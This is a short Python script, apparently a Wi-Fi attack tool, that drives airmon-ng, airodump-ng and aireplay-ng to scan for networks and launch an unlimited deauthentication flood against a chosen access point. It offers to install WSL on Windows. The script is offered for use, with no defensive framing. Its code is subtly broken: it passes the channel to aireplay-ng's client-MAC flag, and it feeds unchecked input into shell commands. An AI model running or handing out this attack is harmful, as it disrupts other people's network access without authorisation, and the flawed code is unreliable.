import os
import platform

def wifi_attacker():
    system = platform.system()
    if system == "Linux":
        interface = input("Enter your Wi-Fi interface (e.g., wlan0): ")
        print("Scanning for networks...")
        os.system(f"sudo airmon-ng start {interface}")
        os.system(f"sudo airodump-ng {interface}mon")
        bssid = input("Enter the target BSSID: ")
        channel = input("Enter the target channel: ")
        print("Launching deauthentication attack...")
        os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} -c {channel} {interface}mon")
    elif system == "Windows":
        print("Wi-Fi attacks are not natively supported on Windows.")
        response = input("Would you like to set up a virtual Linux environment using WSL? (Y/N): ").strip().lower()
        if response == 'y':
            print("Installing WSL...")
            os.system("wsl --install")
            print("WSL installed. Please restart your system and re-run this script inside the WSL environment.")
        else:
            print("Exiting the tool.")
    else:
        print(f"Unsupported OS: {system}")

if __name__ == "__main__":
    wifi_attacker()